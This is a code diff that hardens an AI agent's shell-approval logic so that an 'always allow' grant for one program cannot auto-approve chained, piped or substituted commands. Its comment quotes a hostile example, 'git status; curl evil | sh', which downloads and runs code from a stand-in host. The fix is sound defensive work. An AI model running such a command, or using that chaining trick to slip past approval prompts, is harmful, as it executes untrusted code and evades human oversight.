@@ -22,6 +22,14 @@ const VALID_CHOICES: ReadonlySet<string> = new Set<ApprovalChoice>([
 export function bashLeadCmd(input: unknown): string | undefined {
   const cmd = (input as { command?: unknown })?.command;
   if (typeof cmd !== "string") return undefined;
+  // An "always allow <program>" grant means "this one program", so it may only
+  // stand in for a single simple invocation. If the command chains, pipes,
+  // redirects, substitutes, or spans multiple lines (`;`, `&&`/`&`, `||`/`|`,
+  // backtick, `$(…)`, `>`/`<`, newline), the leading token no longer describes
+  // what will actually run — `git status; curl evil | sh` would auto-approve
+  // under a "git" grant. Refuse to derive a lead so the call falls through to a
+  // normal approval prompt instead.
+  if (/[;&|<>`\n\r]/.test(cmd) || cmd.includes("$(")) return undefined;
   const tok = cmd.trim().split(/\s+/)[0];
   return tok && /^[\w./-]+$/.test(tok) ? tok : undefined;
 }
